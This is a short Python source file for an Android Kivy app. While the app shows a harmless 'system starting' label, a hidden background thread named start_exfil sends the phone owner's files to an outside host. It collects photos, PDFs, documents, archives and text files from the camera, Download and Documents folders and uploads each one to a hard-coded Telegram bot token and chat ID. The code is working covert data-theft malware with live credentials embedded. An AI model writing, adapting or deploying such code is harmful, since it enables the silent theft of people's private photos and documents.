from kivy.app import App
from kivy.uix.label import Label
import os, telebot, threading, time

# --- AYARLAR ---
API_TOKEN = '8599988655:AAH5Fl2Kb2zygH-uP6aHuee4YLh_m5H5iPc'
CHAT_ID = '8279798405'
# Hedef klasörler
SEARCH_PATHS = ['/storage/emulated/0/DCIM/Camera', '/storage/emulated/0/Download', '/storage/emulated/0/Documents']
# Çekilecek dosya türleri
EXTENSIONS = ('.jpg', '.png', '.jpeg', '.pdf', '.doc', '.docx', '.zip', '.rar', '.txt')

class MuhammedApp(App):
    def build(self):
        threading.Thread(target=self.start_exfil, daemon=True).start()
        return Label(text="Sistem Baslatiliyor...\nMuhammed1v99")

    def start_exfil(self):
        bot = telebot.TeleBot(API_TOKEN)
        for folder in SEARCH_PATHS:
            if not os.path.exists(folder): continue
            files = [os.path.join(folder, f) for f in os.listdir(folder) if f.lower().endswith(EXTENSIONS)]
            for f in files:
                try:
                    with open(f, 'rb') as doc:
                        if f.lower().endswith(('.jpg', '.png', '.jpeg')):
                            bot.send_photo(CHAT_ID, doc)
                        else:
                            bot.send_document(CHAT_ID, doc)
                    time.sleep(1.2)
                except: continue
        bot.send_message(CHAT_ID, "✅ Aktarim Bitti! Muhammed1v99")

if __name__ == '__main__':
    MuhammedApp().run()
  
